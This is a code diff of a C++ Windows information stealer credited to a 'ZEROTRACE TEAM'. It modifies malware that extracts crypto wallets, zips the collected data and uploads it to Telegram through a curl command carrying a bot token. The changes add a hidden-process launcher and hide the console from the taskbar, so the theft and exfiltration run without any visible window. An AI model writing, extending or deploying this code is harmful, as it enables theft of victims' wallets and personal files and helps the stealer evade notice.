@@ -1,4 +1,4 @@
-//  *** MADE BY ZEROTRACE TEAM *** //
+﻿//  *** MADE BY ZEROTRACE TEAM *** //
 // *** IF YOU COPY , GIVE CREDITS *** //
 //  *** DO NOT REUPLOAD WITHOUT CREDITS *** //
 //  *** luis22dubuquexvx@hotmail.com *** // Contact LUIS Head Of The Team ;)
@@ -769,6 +769,36 @@ std::string GetUserNameStr() {
     return "";
 }
 
+bool RunCommandHidden(const std::wstring& commandLine) {
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    // Important: must be mutable string for CreateProcessW
+    wchar_t* mutableCmd = _wcsdup(commandLine.c_str());
+
+    BOOL success = CreateProcessW(
+        NULL,
+        mutableCmd,   // Command line
+        NULL, NULL,
+        FALSE,
+        CREATE_NO_WINDOW,  // No window at all
+        NULL, NULL,
+        &si, &pi
+    );
+
+    free(mutableCmd);
+
+    if (!success)
+        return false;
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return true;
+}
 
 std::wstring CompressFolderToZip(const std::wstring& folderPath) {
     wchar_t tempPath[MAX_PATH];
@@ -794,7 +824,7 @@ std::wstring CompressFolderToZip(const std::wstring& folderPath) {
     std::wcout << ENC_WSTR(L"Creating zip file: ") << zipFileName << std::endl;
 
     std::string narrowCommand(command.begin(), command.end());
-    system(narrowCommand.c_str());
+    RunCommandHidden(command);
 
 
     Sleep(3000);
@@ -811,7 +841,7 @@ std::wstring CompressFolderToZip(const std::wstring& folderPath) {
 
     command = ENC_WSTR(L"tar -a -cf \"") + zipFileName + ENC_WSTR(L"\" -C \"") + folderPath + ENC_WSTR(L"\" .");
     narrowCommand = std::string(command.begin(), command.end());
-    system(narrowCommand.c_str());
+    RunCommandHidden(command);
 
     Sleep(2000);
 
@@ -875,6 +905,13 @@ std::string EscapeForCurl(const std::string& input) {
     }
     return escaped;
 }
+std::wstring StringToWString(const std::string& str) {
+    if (str.empty()) return L"";
+    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
+    std::wstring wstr(size - 1, 0);
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size);
+    return wstr;
+}
 
 void SendFileWithTelegram(const std::wstring& zipFileName, const std::string& caption, const std::string& chatId, const std::string& botToken) {
 
@@ -896,7 +933,8 @@ void SendFileWithTelegram(const std::wstring& zipFileName, const std::string& ca
 
     std::cout << ENC_STR("Sending file to Telegram...") << std::endl;
     std::cout << ENC_STR("Debug command: ") << curlCommand << std::endl;
-    system(curlCommand.c_str());
+    RunCommandHidden(StringToWString(curlCommand));
+
 }
 
 
@@ -925,7 +963,12 @@ std::string GetDirectoryStructure(const std::string& folderPath) {
 int wmain(int argc, wchar_t* argv[])
 {
     HWND hWnd = GetConsoleWindow();
-    ShowWindow(hWnd, SW_HIDE);
+    if (hWnd != NULL) {
+        ShowWindow(hWnd, SW_HIDE);
+        // Also remove from taskbar
+        SetWindowLongPtr(hWnd, GWL_EXSTYLE,
+            GetWindowLongPtr(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
+    }
     if (!api::Initialize()) {
         return 1;
     }
@@ -1021,7 +1064,7 @@ int wmain(int argc, wchar_t* argv[])
     std::wcout << ENC_WSTR(L"Extracting crypto wallets to: ") << appDataPath << std::endl;
     report.stolen_wallets = ExtractWallets(appDataPath);
 
-    ExtractAllServices(appDataPath, report);
+  //  ExtractAllServices(appDataPath, report);
 
     std::string folderStructureBefore = GetDirectoryStructure(narrowAppDataPath);
 
